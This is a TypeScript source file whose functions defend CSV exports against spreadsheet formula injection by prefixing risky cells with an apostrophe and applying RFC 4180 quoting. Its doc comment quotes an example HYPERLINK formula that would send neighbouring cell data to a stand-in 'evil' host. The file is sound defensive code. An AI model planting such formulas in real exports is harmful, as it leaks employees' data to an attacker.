/**
 * A CSV cell a spreadsheet will show, never run.
 *
 * Excel, Sheets and LibreOffice evaluate a cell that starts with `= + - @` (and a tab or carriage
 * return in front of one), so an employee name of `=HYPERLINK("https://evil/?"&A1)` in an
 * export becomes a live link that leaks its neighbours when an HR admin opens the file. The
 * leading apostrophe makes the application treat the cell as text. Plain numbers, negative
 * ones included, are left alone: payroll reports carry deductions as `-1200.00`.
 */
export function neutralizeSpreadsheetFormula(value: string): string {
  if (/^-?\d+(\.\d+)?$/.test(value)) return value;
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

/** RFC 4180 quoting on top of the formula guard. */
export function safeCsvCell(value: unknown): string {
  const text = value === null || value === undefined ? "" : String(value);
  return `"${neutralizeSpreadsheetFormula(text).replace(/"/g, '""')}"`;
}
